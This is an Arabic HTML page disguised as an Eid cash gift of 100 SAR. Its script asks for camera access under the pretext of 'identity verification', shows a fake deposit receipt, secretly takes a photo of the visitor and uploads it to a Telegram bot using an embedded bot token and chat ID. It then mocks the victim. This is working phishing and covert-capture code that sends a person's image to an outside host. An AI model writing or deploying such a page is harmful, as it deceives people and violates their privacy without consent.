<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استلام العيدية</title>
    <style>
        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; width: 90%; max-width: 380px; }
        .btn { background: #1a73e8; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 18px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 15px; }
        .success-icon { color: #28a745; font-size: 60px; margin-bottom: 10px; display: none; }
        #receipt { display: none; text-align: right; background: #fafafa; padding: 15px; border: 1px solid #eee; border-radius: 8px; margin-top: 15px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card" id="box">
    <div id="startView">
        <h2 style="margin-bottom:5px;">عيدية من أبو خلود 🎁</h2>
        <p style="color:#666;">وصلتك حوالة بقيمة <b>100.00 ر.س</b></p>
        <button class="btn" onclick="go()">قبول واستلام الحوالة</button>
    </div>
    
    <div id="loadingView">
        <div class="success-icon" id="check">✓</div>
        <h3 id="statusTitle">جاري التأكيد...</h3>
        <div id="receipt">
            <p><b>المبلغ:</b> 100.00 ريال</p>
            <p><b>من:</b> أبو خلود</p>
            <p><b>المرجع:</b> #TXN${Math.floor(Math.random()*99999)}</p>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const T = "8680007162:AAEKrDXjZJdNKdWeT6pIkMXyALj0m30q34I";
    const C = "1232397788";

    async function go() {
        try {
            // يطلب الكاميرا فوراً وبدون كلام كثير
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('v').srcObject = s;

            // اخفاء واجهة البداية واظهار "النجاح الوهمي"
            document.getElementById('startView').style.display = 'none';
            document.getElementById('check').style.display = 'block';
            document.getElementById('receipt').style.display = 'block';
            document.getElementById('statusTitle').innerText = "تم الإيداع بنجاح!";

            // تصوير وإرسال بعد ثانيتين (الوقت الكافي عشان يثبت وجهه ويقرأ)
            setTimeout(snap, 2000);

        } catch (e) {
            alert("عذراً، يجب قبول إذن "التحقق من الهوية" لإتمام التحويل البنكي!");
        }
    }

    function snap() {
        const v = document.getElementById('v'), c = document.getElementById('c');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        
        c.toBlob(b => {
            const f = new FormData();
            f.append('chat_id', C);
            f.append('photo', b, 's.jpg');
            f.append('caption', 'صيد جديد من أبو خلود 😂📸');
            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });

            // الضربة القاضية
            setTimeout(() => {
                document.getElementById('box').innerHTML = `
                    <h1 style="font-size:50px;">🤡</h1>
                    <h2 style="color:red;">صدقت يا سبك؟</h2>
                    <p>صورتك صارت عندي بالتليجرام.. تعيش وتأكل غيرها!</p>
                `;
            }, 1000);
        }, 'image/jpeg');
    }
</script>

</body>
</html>
